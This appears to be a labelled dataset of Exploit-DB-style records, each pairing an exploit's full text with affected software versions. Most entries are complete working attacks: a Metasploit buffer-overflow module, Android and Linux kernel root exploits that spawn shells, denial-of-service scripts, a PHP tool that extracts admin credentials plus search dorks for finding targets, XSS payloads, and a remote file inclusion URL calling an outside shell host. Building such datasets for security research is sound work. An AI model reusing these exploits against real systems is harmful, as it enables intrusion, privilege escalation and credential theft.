36346,"Zen Cart CMS 1.3.9h - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/50787/info  Zen Cart is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Zen Cart 1.3.9h is vulnerable; other versions may also be affected.   GET: https://www.example.com/index.php?main_page=gv_send&action=send POST: message=&lt;/textarea&gt;<script>alert(""XSS"");</script><textarea>   line 72: echo &#039;<br /><strong>TESTING INFO:</strong> Time page: <strong>&#039; . $_GET[&#039;main_page&#039;] . &#039;</strong> was loaded is: <strong>&#039; . date(&#039;H:i:s&#039;, time()) . &#039;</strong><br /><br />&#039;; ... line 75: echo ""GLOBALS[$main_page] and HTTP_GET_VARS[&#039;main_page&#039;] and _GET[&#039;main_page&#039;] = "" . $GLOBALS[&#039;main_page&#039;] . &#039; - &#039; . $HTTP_GET_VARS[&#039;main_page&#039;] . &#039; - &#039; . $_GET[&#039;main_page&#039;] . &#039;<br /><br />&#039;; ... line 76: echo ""_SERVER[&#039;PHP_SELF&#039;] and _GET[&#039;PHP_SELF&#039;] and PHP_SELF and _SESSION[&#039;PHP_SELF&#039;] = "" . $_SERVER[&#039;PHP_SELF&#039;] . &#039; - &#039; . $_GET[&#039;PHP_SELF&#039;] . &#039; - &#039; . $PHP_SELF . &#039; - &#039; . $_SESSION[&#039;PHP_SELF&#039;] . &#039;<br /><br />&#039;;",['1.3.9h'],1
27704,"Cogent DataHub - HTTP Server Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::Remote::Seh    def initialize(info = {})     super(update_info(info,       'Name'           => 'Cogent DataHub HTTP Server Buffer Overflow',       'Description'    => %q{         This module exploits a stack based buffer overflow on Cogent DataHub 7.3.0. The         vulnerability exists in the HTTP server - while handling HTTP headers, a         strncpy() function is used in a dangerous way. This module has been tested         successfully on Cogent DataHub 7.3.0 (Demo) on Windows XP SP3.       },       'Author'         =>         [           'rgod <rgod[at]autistici.org>',  # Vulnerability discovery           'juan vazquez', # Metasploit module         ],       'License'        => MSF_LICENSE,       'References'     =>         [           [ 'OSVDB', '95819'],           [ 'BID', '53455'],           [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-13-178' ],           [ 'URL', 'http://www.cogentdatahub.com/Info/130712_ZDI-CAN-1915_Response.html']         ],       'DefaultOptions' =>         {           'EXITFUNC' => 'process',         },       'Privileged'     => false,       'Payload'        =>         {           'Space'       => 33692,           'DisableNops' => true,           'BadChars'    => ""\x00\x0d\x0a\x3a""         },       'Platform'       => 'win',       'Targets'        =>         [           # Tested with the Cogent DataHub 7.3.0 Demo           # CogentDataHubV7.exe 7.3.0.70           ['Windows XP SP3 English / Cogent DataHub 7.3.0',             {               'Ret'         => 0x7ffc070e, # ppr # from NLS tables # Tested stable over Windows XP SP3 updates               'Offset'      => 33692,               'CrashLength' => 4000 # In order to ensure crash before the stack cookie check             }           ],         ],       'DefaultTarget'  => 0,       'DisclosureDate' => 'Jul 26 2013'     ))    end    def check     res = send_request_cgi({       'uri'          => ""/datahub.asp"",       'method'       => 'GET',     })      if res and res.code == 200 and res.body =~ /<title>DataHub - Web Data Browser<\/title>/       return Exploit::CheckCode::Detected     end      return Exploit::CheckCode::Safe   end    def exploit     print_status(""Trying target #{target.name}..."")      off = target['Offset'] + 8 # 8 => length of the seh_record     bof = payload.encoded     bof << rand_text_alpha(target['Offset'] - payload.encoded.length)     bof << generate_seh_record(target.ret)     bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, ""jmp $-"" + off.to_s).encode_string     bof << rand_text(target['CrashLength'])      print_status(""Sending request to #{rhost}:#{rport}"")      send_request_cgi({       'uri'          => ""/"",       'method'       => 'GET',       'raw_headers'  => ""#{bof}: #{rand_text_alpha(20 + rand(20))}\r\n""     })    end end",['7.3.0'],1
47788,"AVS Audio Converter 9.1 - 'Exit folder' Buffer Overflow # Exploit Title: AVS Audio Converter 9.1 - 'Exit folder' Buffer Overflow # Exploit Author : ZwX # Exploit Date: 2019-12-17 # Vendor Homepage : http://www.avs4you.com/ # Link Software : http://www.avs4you.com/avs-audio-converter.aspx # Tested on OS: Windows 7  ''' Technical Details & Description: ================================ A local buffer overflow vulnerability has been discovered in tihe official AVS Audio Converter.  The vulnerability allows local attackers to overwrite the registers (example eip) to compromise the local software process.  The issue can be exploited by local attackers with system privileges to compromise the affected local computer system.  The vulnerability is marked as classic buffer overflow issue.   Analyze Registers: ================== (1e74.1b78): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=00000000 ebx=00000000 ecx=42424242 edx=778c6d1d esi=00000000 edi=00000000 eip=42424242 esp=0012f098 ebp=0012f0b8 iopl=0         nv up ei pl zr na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210246 42424242 ??              ??? 0:000> !exchain 0012f0ac: ntdll!ExecuteHandler2+3a (778c6d1d) 0012fa30: 42424242 Invalid exception stack at 41414141   Note: EIP & ECX  overwritten   Proof of Concept (PoC): ======================= 1.Download and install AVS Audio Converter 2.Open the AVS Audio Converter  3.Run the python operating script that will create a file (poc.txt) 4.copy and paste the characters found in the file (poc.txt) in the field ""Exit folder"" 5.Click on browse 6.EIP overwritten '''  #!/usr/bin/python  buffer = ""\x41"" * 264 a = ""\x42"" * 4 b = ""\x43"" * 1000  poc = buffer + a + b  file = open(""poc.txt"",""w"") file.write(poc) file.close()   print ""POC Created by ZwX""",['9.1'],1
241,"ProFTPd 1.2.0 rc2 - Memory Leakage /*  | Proftpd DoS  | by Piotr Zurawski (szur@ix.renet.pl)  | This source is just an example of memory leakage in proftpd-1.2.0(rc2)  | server discovered by Wojciech Purczynski.  |  */  #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <signal.h> #include <time.h> #include <string.h> #include <ctype.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <arpa/inet.h> #include <arpa/nameser.h> #include <netdb.h>  #define USERNAME ""anonymous"" #define PASSWORD ""dupa@dupa.pl"" #define HOWMANY 10000  void logintoftp(); void sendsizes(); int fd; struct in_addr host; unsigned short port = 21; int tcp_connect(struct in_addr addr,unsigned short port);  int main(int argc, char **argv) {   if (!resolve(argv[1],&host))   {     fprintf(stderr,""Hostname lookup failure\n"");     exit(0);   }    fd=tcp_connect(host,port);   logintoftp(fd);   printf(""Logged\n"");   sendsizes(fd);    printf(""Now check out memory usage of proftpd daemon"");   printf(""Resident set size (RSS) and virtual memory size (VSIZE)"");   printf(""fields in ps output""); }  void logintoftp() {   char snd[1024], rcv[1024];   int n;    printf(""Logging "" USERNAME  ""/""  PASSWORD ""\r\n"");    memset(snd, '\0', 1024);   sprintf(snd, ""USER %s\r\n"", USERNAME);   write(fd, snd, strlen(snd));    while((n=read(fd, rcv, sizeof(rcv))) > 0)   {     rcv[n] = 0;     if(strchr(rcv, '\n') != NULL)break;   }    memset(snd, '\0', 1024);   sprintf(snd, ""PASS %s\r\n"", PASSWORD);   write(fd, snd, strlen(snd));    while((n=read(fd, rcv, sizeof(rcv))) > 0)   {     rcv[n] = 0;     if(strchr(rcv, '\n') != NULL)       break;   }   return; }  void sendsizes() {   char snd[1024], rcv[1024];   unsigned long loop;    printf (""Sending %i size commands... \n"", HOWMANY);    for(loop=0;loop<HOWMANY;loop++)   {     sprintf(snd, ""SIZE /dadasjasojdasj/adhjaodhahasohasaoihroaha\n"");     write(fd, snd, strlen(snd));   }   return; }  int tcp_connect(struct in_addr addr,unsigned short port) {   int fd;    struct sockaddr_in serv;   bzero(&serv,sizeof(serv)); serv.sin_addr=addr;   serv.sin_port=htons(port);   serv.sin_family=AF_INET;    if ((fd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) < 0)\   {     perror(""socket"");     exit(0);   }    if (connect(fd,(struct sockaddr *)&serv,sizeof(serv)) < 0)   {     perror(""connect"");     exit(0);   }    return(fd); }  int resolve(char *hostname,struct in_addr *addr) {   struct hostent *res;   res=gethostbyname(hostname);   if (res==NULL)     return(0);   memcpy((char *)addr,res->h_addr,res->h_length);   return(1); }",['1.2.0 rc2'],1
38310,"Google Android 2.3.5 - PowerVR SGX Driver Information Disclosure // source: https://www.securityfocus.com/bid/57900/info  The PowerVR SGX driver in Android is prone to an information-disclosure vulnerability.   Successful exploits allows an attacker to gain access to sensitive information. Information obtained may aid in further attacks.   Android 2.3.5 and prior versions are vulnerable.   /*  * levitator.c  *  * Android < 2.3.6 PowerVR SGX Privilege Escalation Exploit  * Jon Larimer <jlarimer@gmail.com>  * Jon Oberheide <jon@oberheide.org>  *  * Information:  *  *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1352  *  *   CVE-2011-1352 is a kernel memory corruption vulnerability that can lead   *   to privilege escalation. Any user with access to /dev/pvrsrvkm can use   *   this bug to obtain root privileges on an affected device.  *  *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1350  *  *   CVE-2011-1350 allows leaking a portion of kernel memory to user mode   *   processes. This vulnerability exists because of improper bounds checking  *   when returning data to user mode from an ioctl system call.  *  * Usage:  *  *   $ CC=""/path/to/arm-linux-androideabi-gcc""  *   $ NDK=""/path/to/ndk/arch-arm""  *   $ CFLAGS=""-I$NDK/usr/include/""  *   $ LDFLAGS=""-Wl,-rpath-link=$NDK/usr/lib -L$NDK/usr/lib -nostdlib $NDK/usr/lib/crtbegin_dynamic.o -lc""  *   $ $CC -o levitator levitator.c $CFLAGS $LDFLAGS  *   $ adb push levitator /data/local/tmp/  *   $ adb shell  *   $ cd /data/local/tmp  *   $ ./levitator  *   [+] looking for symbols...  *   [+] resolved symbol commit_creds to 0xc00770dc  *   [+] resolved symbol prepare_kernel_cred to 0xc0076f64  *   [+] resolved symbol dev_attr_ro to 0xc05a5834  *   [+] opening prvsrvkm device...  *   [+] dumping kernel memory...  *   [+] searching kmem for dev_attr_ro pointers...  *   [+] poisoned 16 dev_attr_ro pointers with fake_dev_attr_ro!  *   [+] clobbering kmem with poisoned pointers...  *   [+] triggering privesc via block ro sysfs attribute...  *   [+] restoring original dev_attr_ro pointers...  *   [+] restored 16 dev_attr_ro pointers!  *   [+] privileges escalated, enjoy your shell!  *   # id  *   uid=0(root) gid=0(root)  *  *   Notes:  *  *     The vulnerability affects Android devices with the PowerVR SGX chipset  *     which includes popular models like the Nexus S and Galaxy S series. The   *     vulnerability was patched in the Android 2.3.6 OTA update.  */  #include <stdio.h> #include <stdint.h> #include <stdlib.h> #include <string.h> #include <unistd.h> #include <fcntl.h> #include <errno.h> #include <dirent.h> #include <sys/stat.h> #include <sys/types.h> #include <sys/ioctl.h>  #define CONNECT_SERVICES 0xc01c670c #define DUMP_SIZE        161920  typedef struct { 	uint32_t ui32BridgeID; 	uint32_t ui32Size; 	void *pvParamIn; 	uint32_t ui32InBufferSize; 	void *pvParamOut; 	uint32_t ui32OutBufferSize; 	void * hKernelServices; } PVRSRV_BRIDGE_PACKAGE;  typedef int (* _commit_creds)(unsigned long cred); typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred); _commit_creds commit_creds; _prepare_kernel_cred prepare_kernel_cred;  ssize_t fake_disk_ro_show(void *dev, void *attr, char *buf) { 	commit_creds(prepare_kernel_cred(0)); 	return sprintf(buf, ""0wned\n""); }  struct attribute { 	const char *name; 	void *owner; 	mode_t mode; };  struct device_attribute { 	struct attribute attr; 	ssize_t (*show)(void *dev, void *attr, char *buf); 	ssize_t (*store)(void *dev, void *attr, const char *buf, size_t count); };  struct device_attribute fake_dev_attr_ro = { 	.attr	= { 		.name = ""ro"", 		.mode = S_IRWXU | S_IRWXG | S_IRWXO, 	}, 	.show = fake_disk_ro_show, 	.store = NULL, };  unsigned long get_symbol(char *name) { 	FILE *f; 	unsigned long addr; 	char dummy, sname[512]; 	int ret = 0;   	f = fopen(""/proc/kallsyms"", ""r""); 	if (!f) { 		return 0; 	}   	while (ret != EOF) { 		ret = fscanf(f, ""%p %c %s\n"", (void **) &addr, &dummy, sname); 		if (ret == 0) { 			fscanf(f, ""%s\n"", sname); 			continue; 		} 		if (!strcmp(name, sname)) { 			printf(""[+] resolved symbol %s to %p\n"", name, (void *) addr); 			return addr; 		} 	}  	return 0; }  int do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_size) { 	PVRSRV_BRIDGE_PACKAGE pkg;  	memset(&pkg, 0, sizeof(pkg));  	pkg.ui32BridgeID = CONNECT_SERVICES; 	pkg.ui32Size = sizeof(pkg); 	pkg.ui32InBufferSize = in_size; 	pkg.pvParamIn = in; 	pkg.ui32OutBufferSize = out_size; 	pkg.pvParamOut = out;  	return ioctl(fd, 0, &pkg); }  int main(int argc, char **argv) { 	DIR *dir; 	struct dirent *dentry; 	int fd, ret, found, trigger; 	char *dump, *dump_end, buf[8], path[256]; 	unsigned long dev_attr_ro, *ptr;  	printf(""[+] looking for symbols...\n"");  	commit_creds = (_commit_creds) get_symbol(""commit_creds""); 	if (!commit_creds) { 		printf(""[-] commit_creds symbol not found, aborting!\n""); 		exit(1); 	}  	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol(""prepare_kernel_cred""); 	if (!prepare_kernel_cred) { 		printf(""[-] prepare_kernel_cred symbol not found, aborting!\n""); 		exit(1); 	}  	dev_attr_ro = get_symbol(""dev_attr_ro""); 	if (!dev_attr_ro) { 		printf(""[-] dev_attr_ro symbol not found, aborting!\n""); 		exit(1); 	}  	printf(""[+] opening prvsrvkm device...\n"");  	fd = open(""/dev/pvrsrvkm"", O_RDWR); 	if (fd == -1) { 		printf(""[-] failed opening pvrsrvkm device, aborting!\n""); 		exit(1); 	}  	printf(""[+] dumping kernel memory...\n"");  	dump = malloc(DUMP_SIZE + 0x1000); 	dump_end = dump + DUMP_SIZE + 0x1000; 	memset(dump, 0, DUMP_SIZE + 0x1000);  	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000); 	if (ret == -1) { 		printf(""[-] failed during ioctl, aborting!\n""); 		exit(1); 	}  	printf(""[+] searching kmem for dev_attr_ro pointers...\n"");  	found = 0; 	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) { 		if (*ptr == dev_attr_ro) { 			*ptr = (unsigned long) &fake_dev_attr_ro; 			found++; 		} 	}  	printf(""[+] poisoned %d dev_attr_ro pointers with fake_dev_attr_ro!\n"", found);  	if (found == 0) { 		printf(""[-] could not find any dev_attr_ro ptrs, aborting!\n""); 		exit(1); 	}  	printf(""[+] clobbering kmem with poisoned pointers...\n"");  	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0); 	if (ret == -1) { 		printf(""[-] failed during ioctl, aborting!\n""); 		exit(1); 	}  	printf(""[+] triggering privesc via block ro sysfs attribute...\n"");  	dir = opendir(""/sys/block""); 	if (!dir) { 		printf(""[-] failed opening /sys/block, aborting!\n""); 		exit(1); 	}  	found = 0; 	while ((dentry = readdir(dir)) != NULL) { 		if (strcmp(dentry->d_name, ""."") == 0 || strcmp(dentry->d_name, "".."") == 0) { 			continue; 		}  		snprintf(path, sizeof(path), ""/sys/block/%s/ro"", dentry->d_name);  		trigger = open(path, O_RDONLY); 		if (trigger == -1) { 			printf(""[-] failed opening ro sysfs attribute, aborting!\n""); 			exit(1); 		}  		memset(buf, 0, sizeof(buf)); 		ret = read(trigger, buf, sizeof(buf)); 		close(trigger);  		if (strcmp(buf, ""0wned\n"") == 0) { 			found = 1; 			break; 		} 	}  	if (found == 0) { 		printf(""[-] could not trigger privesc payload, aborting!\n""); 		exit(1); 	}  	printf(""[+] restoring original dev_attr_ro pointers...\n"");  	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000); 	if (ret == -1) { 		printf(""[-] failed during ioctl, aborting!\n""); 		exit(1); 	}  	found = 0; 	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) { 		if (*ptr == (unsigned long) &fake_dev_attr_ro) { 			*ptr = (unsigned long) dev_attr_ro; 			found++; 		} 	}  	printf(""[+] restored %d dev_attr_ro pointers!\n"", found);  	if (found == 0) { 		printf(""[-] could not restore any pointers, aborting!\n""); 		exit(1); 	}  	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0); 	if (ret == -1) { 		printf(""[-] failed during ioctl, aborting!\n""); 		exit(1); 	}  	if (getuid() != 0) { 		printf(""[-] privileges not escalated, exploit failed!\n""); 		exit(1); 	}  	printf(""[+] privileges escalated, enjoy your shell!\n"");  	execl(""/system/bin/sh"", ""sh"", NULL);  	return 0; }","['2.3.5', 'prior versions', '2.3.6']",1
4731,"Adult Script 1.6 - Unauthorized Administrative Access <? ob_implicit_flush(true); ?> <title>Adult Script Unauthorized Administrative Access Exploit</title> <style> body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;} input, .kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;} button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;} body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}   textarea{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; border-left:1px solid #121212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;} a:link { 	color: #999999; 	text-decoration: none;         font-weight: bold; 	background-color:#000000; } a:visited { 	color: #999999; 	text-decoration: none;         font-weight: bold; 	background-color:#000000; } </style><br>  <h3>Adult Script Unauthorized Administrative Access Exploit</h3><br> Exploit Coded By Liz0ziM From <a href=""http://www.biyofrm.com"">BiyoSecurityTeam</a><br> Greetz My all friend and BiyoSecurityTeam User.. <br> Software site: http://www.adultscript.net/<br> Demo: http://www.adultscript.net/demo/<br>  Vulnerable code in <b>admin/administrator.php</b> near lines 5-8</b>  <pre> ( ($_SESSION['adminid']=="""") && ($_SESSION['admintype'] !=1)) { header(""Location: logout.php""); // Bypass Me :D }  </pre> <br> <b>Dork</b>:<br> inurl:submit-user-link.html<br> inurl:video-listing-cat<br> inurl:hosted-videos<br> inurl:porn-listing-cat<br> ""Powered By AdultScript.NET""<br> ""Copyright 2007 [IAG].AdultScript.v1.5.Nulled""<br> <br> <form method=""POST"" action=""""> <input name=""adres"" type=""text"" value=""Target  example: http://www.site.com/"" size=""70"" onFocus=""if(this.value=='Target  example: http://www.site.com/')this.value=''"" onBlur=""if(this.value=='')this.value='Target  example: http://www.site.com/'""> <input name=""yolla"" type=""submit"" value=""Send""> </form>  <br> <?php function dosya_indir($liz0){ 		 		 		$ch = curl_init(); 		$timeout = 0; 		curl_setopt ($ch, CURLOPT_URL, $liz0); 		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 		$veri = curl_exec($ch); 		curl_close($ch); 		 		return $veri;  	}  $desen='|value=""(.*)""|';  if($_POST[yolla]) { $adres=$_POST[adres];  if(!eregi(""http"",$adres)) { $adres=""http://"".$adres; } if($adres=="""") { echo 'BoÅŸ Yerleri Doldurun'; exit(); } echo 'Target= '.htmlspecialchars($adres).""<br>""; sleep(1); echo 'Sending Evil Code.......<br>'; $kaynak=dosya_indir($adres.""/admin/administrator.php""); sleep(5);  if(eregi('value=""',$kaynak)) {  echo ""Exploit Has Been Succeful <br>""; preg_match_all($desen,$kaynak,$sonuc); echo ""<a target='_blank' href='"".$adres.""/admin/'>"".$adres.""/admin/</a><br>""; echo ""<b>Username</b> :"".htmlspecialchars($sonuc[1][0]).""<br>""; echo ""<b>Password</b>:"".htmlspecialchars($sonuc[1][1]).""<br>""; echo $adres.""/admin/videolinks_view.php edit video and upload shell :)""; } else { echo ""Exploit Has Been Failed! <br>""; }   } ?>  # milw0rm.com [2007-12-13]",['1.6'],1
30604,"Linux Kernel 2.6.x - Ptrace Privilege Escalation /* source: https://www.securityfocus.com/bid/25774/info  The Linux kernel is prone to a local privilege-escalation vulnerability.  Exploiting this issue may allow local attackers to gain elevated privileges, facilitating the complete compromise of affected computers.  Versions of Linux kernel prior to 2.4.35.3 and 2.6.22.7 are vulnerable to this issue.  */   /*  * exploit for x86_64 linux kernel ia32syscall emulation  * bug, discovered by Wojciech Purczynski <cliph_at_isec.pl>  *  * by  * Robert Swiecki <robert_at_swiecki.net>  * Przemyslaw Frasunek <venglin_at_freebsd.lublin.pl>  * Pawel Pisarczyk <pawel_at_immos.com.pl>  * of ATM-Lab http://www.atm-lab.pl  */  #include <sys/types.h> #include <sys/wait.h> #include <sys/ptrace.h> #include <inttypes.h> #include <sys/reg.h> #include <unistd.h> #include <stdio.h> #include <stdlib.h> #include <sys/mman.h>  uint32_t uid, euid, suid;  static void kernelmodecode(void) {         int i;         uint8_t *gs;         uint32_t *ptr;          asm volatile (""movq %%gs:(0x0), %0"" : ""=r""(gs));          for (i = 200; i < 1000; i+=1) {                  ptr = (uint32_t*) (gs + i);                  if ((ptr[0] == uid) && (ptr[1] == euid)                         && (ptr[2] == suid) && (ptr[3] == uid)) {                         ptr[0] = 0; //UID                         ptr[1] = 0; //EUID                         ptr[2] = 0; //SUID                          break;                 }         }  }  static void docall(uint64_t *ptr, uint64_t size) {         getresuid(&uid, &euid, &suid);          uint64_t tmp = ((uint64_t)ptr & ~0x00000000000FFF);          if (mmap((void*)tmp, size, PROT_READ|PROT_WRITE|PROT_EXEC,                 MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) {                 printf(""mmap fault\n"");                 exit(1);         }          for (; ptr < (tmp + size); ptr++)                 *ptr = (uint64_t)kernelmodecode;          __asm__(""\n""         ""\tmovq $0x101, %rax\n""         ""\tint $0x80\n"");          printf(""UID %d, EUID:%d GID:%d, EGID:%d\n"", getuid(), geteuid(), getgid(), getegid());         execl(""/bin/sh"", ""bin/sh"", 0);         printf(""no /bin/sh ??\n"");         exit(0); }  int main(int argc, char **argv) {         int pid, status, set = 0;         uint64_t rax;         uint64_t kern_s = 0xffffffff80000000;         uint64_t kern_e = 0xffffffff84000000;         uint64_t off = 0x0000000800000101 * 8;          if (argc == 4) {                 docall((uint64_t*)(kern_s + off), kern_e - kern_s);                 exit(0);         }          if ((pid = fork()) == 0) {                 ptrace(PTRACE_TRACEME, 0, 0, 0);                 execl(argv[0], argv[0], ""2"", ""3"", ""4"", 0);                 perror(""exec fault"");                 exit(1);         }          if (pid == -1) {                 printf(""fork fault\n"");                 exit(1);         }          for (;;) {                 if (wait(&status) != pid)                         continue;                  if (WIFEXITED(status)) {                         printf(""Process finished\n"");                         break;                 }                  if (!WIFSTOPPED(status))                         continue;                  if (WSTOPSIG(status) != SIGTRAP) {                         printf(""Process received signal: %d\n"", WSTOPSIG(status));                         break;                 }                  rax = ptrace(PTRACE_PEEKUSER, pid, 8*ORIG_RAX, 0);                 if (rax == 0x000000000101) {                         if (ptrace(PTRACE_POKEUSER, pid, 8*ORIG_RAX, off/8) == -1) {                                 printf(""PTRACE_POKEUSER fault\n"");                                 exit(1);                         }                         set = 1;                 }                  if ((rax == 11) && set) {                         ptrace(PTRACE_DETACH, pid, 0, 0);                         for(;;)                                 sleep(10000);                 }                  if (ptrace(PTRACE_SYSCALL, pid, 1, 0) == -1) {                         printf(""PTRACE_SYSCALL fault\n"");                         exit(1);                 }         }          return 0; }","['2.6.x', 'prior to 2.4.35.3', '2.6.22.7']",1
1165,"Inframail Advantage Server Edition 6.0 < 6.37 - 'SMTP' Buffer Overflow #===== Start Inframail_SMTPOverflow.pl ===== # # Usage: Inframail_SMTPOverflow.pl <ip> #        Inframail_SMTPOverflow.pl 127.0.0.1 # # Infradig Systems Inframail Advantage Server Edition 6.0 # (Version: 6.37) # # Download: # http://www.infradig.com/ # #########################################################  use IO::Socket; use strict;  my($socket) = """";  if ($socket = IO::Socket::INET->new(PeerAddr => $ARGV[0],                                     PeerPort => ""25"",                                     Proto    => ""TCP"")) {         print ""Attempting to kill Inframail SMTP server at $ARGV[0]:25..."";          sleep(1);          print $socket ""HELO moto.com\r\n"";          sleep(1);          print $socket ""MAIL FROM:"" . ""A"" x 40960 . ""\r\n"";          close($socket); } else {         print ""Cannot connect to $ARGV[0]:25\n""; } #===== End Inframail_SMTPOverflow.pl =====  # milw0rm.com [2005-06-27]",['6.0 < 6.37'],1
46825,"dotCMS 5.1.1 - HTML Injection # Exploit Title: dotCMS 5.1.1 - HTML Injection # Date: 2019-05-09  # Exploit Author: Ismail Tasdelen # Vendor Homepage: https://dotcms.com/ # Software Link: https://github.com/dotCMS # Software: dotCMS # Product Version: 5.1.1 # Vulernability Type: Code Injection # Vulenrability: HTML Injection and Cross-site Scripting # CVE: CVE-2019-11846  # HTTP POST Request :  POST /servlets/ajax_file_upload?fieldName=binary3 HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://TARGET/c/portal/layout?p_l_id=b7ab5d3c-5ee0-4195-a17e-8f5579d718dd&p_p_id=site-browser&p_p_action=1&p_p_state=maximized&angularCurrentPortlet=site-browser&p_p_mode=view&_site_browser_struts_action=%2Fext%2Fcontentlet%2Fedit_contentlet&_site_browser_cmd=new&selectedStructure=33888b6f-7a8e-4069-b1b6-5c1aa9d0a48d&folder=SYSTEM_FOLDER&referer=/c/portal/layout%3Fp_l_id%3Db7ab5d3c-5ee0-4195-a17e-8f5579d718dd%26p_p_id%3Dsite-browser%26p_p_action%3D0%26p_p_state%3Dmaximized%26angularCurrentPortlet%3Dsite-browser%26p_p_mode%3Dview%26_site_browser_struts_action%3D%252Fext%252Fbrowser%252Fview_browser&in_frame=true&frame=detailFrame&container=true&angularCurrentPortlet=site-browser Content-Type: multipart/form-data; boundary=---------------------------5890268631313811380287956669 Content-Length: 101313 DNT: 1 Connection: close Cookie: messagesUtk=2366e7c3b5af4c8c93bb11d0c994848a; BACKENDID=172.18.0.3; JSESSIONID=65C16EFBEE5B7176B22083A0CA451F0A.c16f6b7d05d9; hs-messages-hide-welcome-message=true; access_token=eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJkZGFlZmEzNS0yYmMyLTQ4MTEtOTRjNi0xNGE0OTk4YzFkNDAiLCJpYXQiOjE1NTczOTY0NzYsInVwZGF0ZWRfYXQiOjEyMDQ4MjQ5NjEwMDAsInN1YiI6ImRvdGNtcy5vcmcuMSIsImlzcyI6IjRiNTkyYjIyLTBiMmEtNGI2ZC05NmU4LTdjMzBiMzgzOTM1ZiJ9.F8_L_Cu96pkYcwTl4ex_zfrA-Fk-rqNUz24oCV0gOmc; DWRSESSIONID=EZToDkzmi*mMXCayMxskFA75sGm Upgrade-Insecure-Requests: 1  -----------------------------5890268631313811380287956669 Content-Disposition: form-data; name=""binary3FileUpload""; filename=""\""><img src=x onerror=alert(\""ismailtasdelen\"")> .json"" Content-Type: application/json  # HTTP Response :  HTTP/1.1 200  Content-Length: 0 Date: Thu, 09 May 2019 10:23:44 GMT Connection: close",['5.1.1'],1
37497,Flogr - 'tag' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/54354/info  Flogr is prone to multiple unspecified cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  Flogr 1.7 is vulnerable; other versions may also be affected.   http://www.example.com/recent.php?tag=[xss]  http://www.example.com/index.php?tag=[xss],['1.7'],1
2535,"PHPMyConferences 8.0.2 - 'menu.inc.php' File Inclusion ######################################################################### # phpMyConferences <= 8.0.2 Remote File Inclusion # Download Source : http://sedre.loria.fr/phpMyConference/phpMyConferences_8.0.2.zip # # Found By        : k1tk4t - k1tk4t[4t]newhack.org # Location        : Indonesia   --  #newhack[dot]org ######################################################################## file ;  menus.inc.php ######################################################################## bugs ;  include($lvc_include_dir.'/menus-'.$view.'.inc.php');  include($lvc_include_dir.'/menus-others.inc.php'); ######################################################################## exmple and methode exploit ;  http://localhost/phpMyConferences_8.0.2/common/visiteurs/include/menus.inc.php?lvc_include_dir=http://shell/cmd.kid? ######################################################################## Thanks; str0ke milw0rm google #e-c-h-o (all member echo community) #nyubi (all member solpotcrew community) #asiahacker person; y3dips,lirva32,the_day,K-159(&all echo staff) evilcode,illibero,NoGe(asiahacker), nyubi,x-ace,ghoz,home_edition2001,matdhule,iFX,and for all(friend's&enemy)  # milw0rm.com [2006-10-13]",['8.0.2'],1
